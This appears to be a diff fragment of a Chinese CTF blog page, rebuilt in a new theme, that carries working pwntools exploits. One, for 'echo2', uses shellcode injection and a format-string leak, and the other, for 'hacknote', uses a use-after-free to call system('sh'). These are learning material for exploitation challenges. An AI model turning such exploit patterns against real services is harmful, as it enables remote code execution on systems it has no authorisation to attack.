class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">shellcode_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;AAA&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;to exit? (y/n)&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;hello \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">24</span>+p64(shellcode_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-p=process(&quot;./echo2&quot;)
-elf=ELF(&quot;./echo2&quot;)
-
-p.recvuntil(&quot;hey, what&#39;s your name? : &quot;)
-shellcode=b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;
-p.sendline(shellcode)
-p.recvuntil(b&quot;&gt; &quot;)
-p.sendline(b&quot;2&quot;)
-
-payload=b&quot;%10$p&quot;+b&quot;A&quot;*3 #A用作标记
-p.sendline(payload)
-p.recvuntil(b&quot;0x&quot;)
-shellcode_addr=int(p.recvuntil(b&#39;AAA&#39;,drop=True),16)-0x20
-
-
-p.recvuntil(b&quot;&gt; &quot;)
-p.sendline(b&quot;4&quot;)
-p.recvuntil(b&quot;to exit? (y/n)&quot;)
-p.sendline(b&quot;n&quot;)
-
-p.recvuntil(b&quot;&gt; &quot;)
-p.sendline(b&quot;3&quot;)
-p.recvuntil(b&quot;hello \n&quot;)
-p.sendline(b&quot;A&quot;*24+p64(shellcode_addr))
-p.interactive()
-</code></pre>
 <p><strong>hacknote（32位）</strong><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620231326851.png" alt="image-20230620231326851"></p>
 <p>​                   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221606653.png" alt="image-20230620221606653"><br>add函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221355683.png" alt="image-20230620221355683"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620220117301.png" alt="image-20230620220117301"></p>
 <p>框住部分掌握控制信息 size对应的chunk可由用户自定义（uaf）control上未puts 下为sub</p>
@@ -905,223 +536,35 @@ p.interactive()
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620224148329.png" alt="image-20230620224148329"></p>
 <p>print（0）对接远程的puts<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230216527.png"></p>
 <p>0此时保存的函数地址 获取0的地址进而利用两个chunk块<br>0中第一部分传入system地址（无可避免）用||（或）sh【前一条语句执行失败则执行sh】妙哉<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230551936.png" alt="image-20230620230551936"></p>
-<pre><code class="python">from pwn import *
- 
-#p = remote(&quot;chall.pwnable.tw&quot;,10102)
-p=process(&quot;./hacknote&quot;)
-elf = ELF(&quot;./hacknote&quot;)
-libc = ELF(&quot;./libc_32.so.6&quot;)
-read_got = elf.got[&quot;read&quot;]
-pfputs = 0x804862b
- 
-def add_note(size,index):
-      p.recvuntil(b&quot;choice :&quot;)
-      p.sendline(b&quot;1&quot;)
-      p.recvuntil(b&quot;size :&quot;)
-      p.sendline(size)
-      p.recvuntil(b&quot;Content :&quot;)
-      p.sendline(index)
- 
-def delete_note(index):
-      p.recvuntil(b&quot;choice :&quot;)
-      p.sendline(b&quot;2&quot;)
-      p.recvuntil(b&quot;Index :&quot;)
-      p.sendline(index)
- 
-def print_note(index):
-      p.recvuntil(b&quot;choice :&quot;)
-      p.sendline(b&quot;3&quot;)
-      p.recvuntil(b&quot;Index :&quot;)
-      p.sendline(index)
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = remote(&quot;chall.pwnable.tw&quot;,10102)</span></span><br><span class="line">p=process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">pfputs = <span class="number">0x804862b</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">size,index</span>):</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">      p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;size :&quot;</span>)</span><br><span class="line">      p.sendline(size)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;Content :&quot;</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_note</span>(<span class="params">index</span>):</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">      p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_note</span>(<span class="params">index</span>):</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">      p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b&quot;16&quot;</span>,<span class="string">b&quot;aaaaa&quot;</span>)</span><br><span class="line">add_note(<span class="string">b&quot;16&quot;</span>,<span class="string">b&quot;aaaaa&quot;</span>)</span><br><span class="line">delete_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delete_note(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add_note(<span class="string">b&#x27;8&#x27;</span>,p32(pfputs)+p32(read_got))</span><br><span class="line">print_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pfread = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">pfsys = pfread - <span class="number">0xd41c0</span> + <span class="number">0x3a940</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">delete_note(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b&#x27;8&#x27;</span>,p32(pfsys)+<span class="string">b&quot;||sh&quot;</span>)</span><br><span class="line">print_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-#p.interactive()
-add_note(b&quot;16&quot;,b&quot;aaaaa&quot;)
-add_note(b&quot;16&quot;,b&quot;aaaaa&quot;)
-delete_note(b&#39;0&#39;)
-delete_note(b&#39;1&#39;)
-add_note(b&#39;8&#39;,p32(pfputs)+p32(read_got))
-print_note(b&#39;0&#39;)
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yubut.github.io">yub</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/">https://yubut.github.io/2023/09/01/【解密系列】pwn基础/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yubut.github.io" target="_blank">幻境</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn-%E7%9F%A5%E8%AF%86%E7%A2%8E%E7%89%87/">pwn,知识碎片</a></div><div class="post_share"><div class="social-share" data-image="https://thumbs.dreamstime.com/b/%E5%8A%A8%E6%BC%AB%E8%83%8C%E6%99%AF%E5%A5%87%E5%B9%BB%E6%8F%92%E5%9B%BE%E6%B8%B8%E6%88%8F%E7%8E%AF%E5%A2%83%E7%AB%A5%E4%B9%A6%E4%BB%99%E5%A2%83%E6%99%AF%E8%A7%82%E6%8F%92%E5%9B%BE-270943592.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/" title="部分PWN题目记录"><img class="cover" src="https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/e4f95a48e6c9c74312ac5ed6fcdc8a14.jpg?x-oss-process=image%2Fresize%2Cm_lfit%2Cw_960%2Ch_540" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">部分PWN题目记录</div></div></a></div><div class="next-post pull-right"><a href="/2023/09/01/ret2csu/" title="ret2csu"><img class="cover" src="https://images.alphacoders.com/131/1311951.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ret2csu</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/" title="部分PWN题目记录"><img class="cover" src="https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/e4f95a48e6c9c74312ac5ed6fcdc8a14.jpg?x-oss-process=image%2Fresize%2Cm_lfit%2Cw_960%2Ch_540" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-01</div><div class="title">部分PWN题目记录</div></div></a></div><div><a href="/2023/11/27/NepCTF%202023/" title="Nep摸鱼记"><img class="cover" src="https://ts2.cn.mm.bing.net/th?id=OIP-C.lXXyg9_hRePKHUIpWoiMUwHaFP&w=297&h=210&c=8&rs=1&qlt=90&o=6&dpr=1.3&pid=3.1&rm=2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-27</div><div class="title">Nep摸鱼记</div></div></a></div><div><a href="/2023/09/01/ret2csu/" title="ret2csu"><img class="cover" src="https://images.alphacoders.com/131/1311951.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-01</div><div class="title">ret2csu</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yub</div><div class="author-info__description">路迟青</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/yubut" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://qm.qq.com/q/Le1ZeB0K40" target="_blank" title=""><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:3023536144@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">程序的编译与链接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">编译过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%90%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%91"><span class="toc-number"></span> <span class="toc-text">【花式栈溢出】</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/06/22/Java%E6%9D%82%E8%AE%B0/" title="Java基础知识杂记"><img src="https://tse4-mm.cn.bing.net/th/id/OIP-C.ZCGnC5HDT4Rwr8DPTY6UiQHaEf?w=300&amp;h=182&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.3&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java基础知识杂记"/></a><div class="content"><a class="title" href="/2024/06/22/Java%E6%9D%82%E8%AE%B0/" title="Java基础知识杂记">Java基础知识杂记</a><time datetime="2024-06-21T16:00:00.000Z" title="发表于 2024-06-22 00:00:00">2024-06-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A2%8E%E7%89%87/" title="数据结构"><img src="https://gd-hbimg.huaban.com/860d15845530de80118005269b1d96b4d9aa44756a834-Abxbe0_fw240webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据结构"/></a><div class="content"><a class="title" href="/2024/01/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A2%8E%E7%89%87/" title="数据结构">数据结构</a><time datetime="2024-01-09T09:51:16.000Z" title="发表于 2024-01-09 17:51:16">2024-01-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/24/The%20Missing%20Semester%20of%20Your%20CS%20Education/" title="The Missing Semester of Your CS Education"><img src="/../imgs/2024-10/miss.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="The Missing Semester of Your CS Education"/></a><div class="content"><a class="title" href="/2023/12/24/The%20Missing%20Semester%20of%20Your%20CS%20Education/" title="The Missing Semester of Your CS Education">The Missing Semester of Your CS Education</a><time datetime="2023-12-24T03:36:16.000Z" title="发表于 2023-12-24 11:36:16">2023-12-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/27/NepCTF%202023/" title="Nep摸鱼记"><img src="https://ts2.cn.mm.bing.net/th?id=OIP-C.lXXyg9_hRePKHUIpWoiMUwHaFP&amp;w=297&amp;h=210&amp;c=8&amp;rs=1&amp;qlt=90&amp;o=6&amp;dpr=1.3&amp;pid=3.1&amp;rm=2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nep摸鱼记"/></a><div class="content"><a class="title" href="/2023/11/27/NepCTF%202023/" title="Nep摸鱼记">Nep摸鱼记</a><time datetime="2023-11-26T16:00:00.000Z" title="发表于 2023-11-27 00:00:00">2023-11-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/" title="C探索碎片——关键字static作用"><img src="https://png.pngtree.com/thumb_back/fh260/back_our/20190622/ourmid/pngtree-blue-sky-free-illustration-image_221359.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C探索碎片——关键字static作用"/></a><div class="content"><a class="title" href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/" title="C探索碎片——关键字static作用">C探索碎片——关键字static作用</a><time datetime="2023-08-31T16:00:00.000Z" title="发表于 2023-09-01 00:00:00">2023-09-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By yub</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'WwVGEcmjEUSp1C3qQTlW8CcS-gzGzoHsz',
+      appKey: 'tqbDrZC8pSB03urdpjIK5oC9',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, ))
+  }
 
-pfread = u32(p.recv()[0:4])
-pfsys = pfread - 0xd41c0 + 0x3a940
-#p.interactive()
-delete_note(b&#39;2&#39;)
-#p.interactive()
-#p.recv()
-#p.interactive()
-add_note(b&#39;8&#39;,p32(pfsys)+b&quot;||sh&quot;)
-print_note(b&#39;0&#39;)
-p.interactive()
-</code></pre>
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
 
-  </div>
-</article>
-
-
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">Home</a></li>
-        
-          <li><a href="/about/">About</a></li>
-        
-          <li><a href="/archives/">Articles</a></li>
-        
-          <li><a href="/categories/">Categories</a></li>
-        
-          <li><a href="/links/">Links</a></li>
-        
-          <li><a href="/tags/">Tags</a></li>
-        
-          <li><a href="/search/">Search</a></li>
-        
-      </ul>
-    </div>
-
-    
-    
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">程序的编译与链接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">编译过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%90%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%91"><span class="toc-number"></span> <span class="toc-text">【花式栈溢出】</span></a>
-      </div>
-    
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&text=pwn探索--大杂烩"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&title=pwn探索--大杂烩"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&is_video=false&description=pwn探索--大杂烩"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=pwn探索--大杂烩&body=Check out this article: https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&title=pwn探索--大杂烩"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&title=pwn探索--大杂烩"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&title=pwn探索--大杂烩"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&title=pwn探索--大杂烩"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&name=pwn探索--大杂烩&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&t=pwn探索--大杂烩"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
-  </div>
-</div>
-
-        
-        <footer id="footer">
-    <div class="footer-left">
-        Copyright ©
-        
-        
-        2023-2024
-        yub
-        <br>
-        <!-- 删除备案信息，如果不需要备案可以省略以下行 -->
-        <!-- <a href="https://beian.miit.gov.cn/" target="_blank">xICP备xxxxxxxx号-x</a> -->
-    </div>
-
-    <div class="footer-right">
-        <nav>
-            <ul>
-                
-                <li><a href="/">Home</a></li>
-                
-                <li><a href="/about/">About</a></li>
-                
-                <li><a href="/archives/">Articles</a></li>
-                
-                <li><a href="/categories/">Categories</a></li>
-                
-                <li><a href="/links/">Links</a></li>
-                
-                <li><a href="/tags/">Tags</a></li>
-                
-                <li><a href="/search/">Search</a></li>
-                
-            </ul>
-            
-            <ul>
-                <span id="busuanzi_container_site_pv">
-                    本站总访问量<span id="busuanzi_value_site_pv"></span>次
-                </span>
-                <span class="post-meta-divider">|</span>
-                <span id="busuanzi_container_site_uv" style='display:none'>
-                    本站访客数<span id="busuanzi_value_site_uv"></span>人
-                </span>
-                <!-- 引入不蒜子脚本 -->
-                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-            </ul>
-            
-        </nav>
-    </div>
-</footer>
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功！");
-      e.clearSelection();
-    })
-  })
-  </script>
-
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
-
-</body>
-</html>
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
